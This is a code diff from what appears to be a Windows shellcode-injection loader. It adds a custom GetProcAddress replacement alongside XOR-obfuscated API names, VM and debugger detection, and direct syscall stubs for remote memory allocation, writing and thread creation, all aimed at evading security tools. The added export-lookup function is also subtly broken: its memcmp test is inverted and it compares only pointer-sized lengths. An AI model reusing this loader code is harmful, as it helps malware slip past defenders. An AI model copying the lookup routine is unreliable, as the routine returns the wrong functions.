@@ -50,9 +50,56 @@ typedef void (WINAPI * GetSystemInfo_t)(LPSYSTEM_INFO lpSystemInfo);
 typedef HANDLE (WINAPI * GetCurrentProcess_t)();
 typedef HANDLE (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
 
+FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    PBYTE pBase = (PBYTE) hModule;
+
+    //Cast DOS header
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+    //Get NTHeader ptr from DOS header
+    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+    //Get Optionalheader for NTHeader
+    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
+    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    /*
+    typedef struct _IMAGE_EXPORT_DIRECTORY {
+        DWORD   Characteristics;
+        DWORD   TimeDateStamp;
+        WORD    MajorVersion;
+        WORD    MinorVersion;
+        DWORD   Name;
+        DWORD   Base;
+        DWORD   NumberOfFunctions;
+        DWORD   NumberOfNames;
+        DWORD   AddressOfFunctions;     // RVA from base of image
+        DWORD   AddressOfNames;         // RVA from base of image
+        DWORD   AddressOfNameOrdinals;  // RVA from base of image
+    } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+    */
+    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+        if (memcmp(pFunctionName, lpProcName, sizeof(lpProcName))) {
+            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
+            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
+            return (FARPROC)pFunctionAddress;
+        }
+    }
+    return NULL;
+}
+
 _SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, PUCHAR NtFunctionName){
     SYSCALL_STUB stub = { 0 };
-    PVOID NtFunctionAddr = (PVOID)GetProcAddress(hNTDLL, (LPCSTR)NtFunctionName);
+    PVOID NtFunctionAddr = (PVOID)MyGetProcAddress(hNTDLL, (LPCSTR)NtFunctionName);
     if (!NtFunctionAddr) return stub;
     printf("[+] Function %s at %p\n", NtFunctionName, NtFunctionAddr);
 
@@ -90,7 +137,7 @@ BOOL isWow64(HANDLE hProcess) {
     BOOL bIsWow64 = FALSE;
 
     typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
-    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
+    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)MyGetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
 
     if (fnIsWow64Process) {
         fnIsWow64Process(hProcess, &bIsWow64);
@@ -113,9 +160,9 @@ int vmDetect(){
     XOR(_GetSystemInfo, sizeof(_GetSystemInfo), key, sizeof(key));
     XOR(_GetCurrentProcess, sizeof(_GetCurrentProcess), key, sizeof(key));
     
-    VirtualAllocExNuma_t pVirtualAllocExNuma = (VirtualAllocExNuma_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_VirtualAllocExNuma);
-    GetSystemInfo_t pGetSystemInfo = (GetSystemInfo_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetSystemInfo);
-    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetCurrentProcess);
+    VirtualAllocExNuma_t pVirtualAllocExNuma = (VirtualAllocExNuma_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_VirtualAllocExNuma);
+    GetSystemInfo_t pGetSystemInfo = (GetSystemInfo_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetSystemInfo);
+    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)MyGetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (LPCSTR)_GetCurrentProcess);
 
     SYSTEM_INFO s;
     MEMORYSTATUSEX ms;
@@ -181,9 +228,9 @@ Resolved functions : \n \
     %s \n", _NtAllocateVirtualMemory, _NtWriteVirtualMemory, _NtCreateThreadEx, _NtWaitForSingleObject, _VirtualFreeEx, _IsDebuggerPresent, _OpenProcess);
 
     HMODULE k32 = GetModuleHandle(TEXT("kernel32.dll"));
-    VirtualFreeEx_t         pVirtualFreeEx       = (VirtualFreeEx_t) GetProcAddress(k32, (LPCSTR)_VirtualFreeEx);
-    IsDebuggerPresent_t     pIsDebuggerPresent   = (IsDebuggerPresent_t) GetProcAddress(k32, (LPCSTR)_IsDebuggerPresent);
-    OpenProcess_t           pOpenProcess         = (OpenProcess_t) GetProcAddress(k32, (LPCSTR)_OpenProcess);
+    VirtualFreeEx_t         pVirtualFreeEx       = (VirtualFreeEx_t) MyGetProcAddress(k32, (LPCSTR)_VirtualFreeEx);
+    IsDebuggerPresent_t     pIsDebuggerPresent   = (IsDebuggerPresent_t) MyGetProcAddress(k32, (LPCSTR)_IsDebuggerPresent);
+    OpenProcess_t           pOpenProcess         = (OpenProcess_t) MyGetProcAddress(k32, (LPCSTR)_OpenProcess);
 
     if (pIsDebuggerPresent()) {
         printf("[-] Debugger detected ! \n");
